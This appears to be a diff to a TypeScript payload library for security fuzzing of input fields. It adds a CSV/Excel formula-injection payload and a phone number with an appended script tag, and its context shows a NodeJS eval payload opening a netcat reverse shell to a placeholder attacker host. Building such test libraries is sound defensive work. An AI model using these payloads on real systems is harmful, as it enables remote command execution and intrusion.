@@ -49,6 +49,12 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
         },
         {
             severity: SeverityLevel.MEDIUM,
+            messages: ['CSV Excel formula injection'],
+            payload: `=cmd|' /C notepad'!'A1'`,
+            tags: ['csv', 'excel', 'formula', 'advanced']
+        },
+        {
+            severity: SeverityLevel.MEDIUM,
             messages: ['NodeJS RCE assuming eval() afterwards'],
             payload: `require("child_process").exec('nc <IP Attacker> 4445 -e /bin/sh')`,
             tags: ['eval', 'rce']
@@ -245,15 +251,21 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
     PHONE: [
         {
             severity: SeverityLevel.INFO,
-            messages: ['Users may submit premium-rate telephone numbers'],
+            messages: ['Users may submit premium-rate phone numbers'],
             payload: '090522726',
             tags: ['phone', 'belgium', 'local']
         },
         {
             severity: SeverityLevel.INFO,
-            messages: ['Users may submit premium-rate telephone numbers'],
+            messages: ['Users may submit premium-rate phone numbers'],
             payload: '+3290522726',
             tags: ['phone', 'belgium', 'international']
+        },
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: ['Unauthorized characters after phone number'],
+            payload: '+3290522726<script></script>',
+            tags: ['phone', 'international']
         }
     ],
 
